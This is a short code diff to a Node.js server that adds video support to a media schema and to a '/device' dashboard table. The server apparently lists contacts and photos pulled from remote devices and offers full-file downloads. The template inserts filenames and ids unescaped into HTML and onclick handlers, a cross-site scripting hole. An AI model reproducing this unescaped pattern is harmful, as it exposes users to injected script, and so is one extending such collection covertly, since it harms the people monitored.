@@ -81,9 +81,11 @@ const ContactSchema = new mongoose.Schema({
 const MediaSchema = new mongoose.Schema({
     token: String,
     filename: String,
+    media_type: { type: String, default: 'image' }, // 'image' | 'video'
     date_taken: Number,
     path: String,
     size_bytes: Number,
+    duration_ms: Number, // videos only
     is_screenshot: Boolean,
     thumbnail: String
 });
@@ -940,7 +942,7 @@ app.get('/device', async (req, res) => {
                     ${media.map(m => `<tr>
                         <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}" data-src="data:image/jpeg;base64,${m.thumbnail}" onclick="openLightbox(this)"/>` : '<span style="color:#9ca3af;font-size:12px">No preview</span>'}</td>
                         <td>${m.filename}</td>
-                        <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
+                        <td>${m.media_type === 'video' ? '🎬 Video' + (m.duration_ms ? ' (' + Math.round(m.duration_ms / 1000) + 's)' : '') : (m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo')}</td>
                         <td>${Math.round(m.size_bytes / 1024)}KB</td>
                         <td>${new Date(m.date_taken).toLocaleString()}</td>
                         <td><button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">Download Full</button></td>
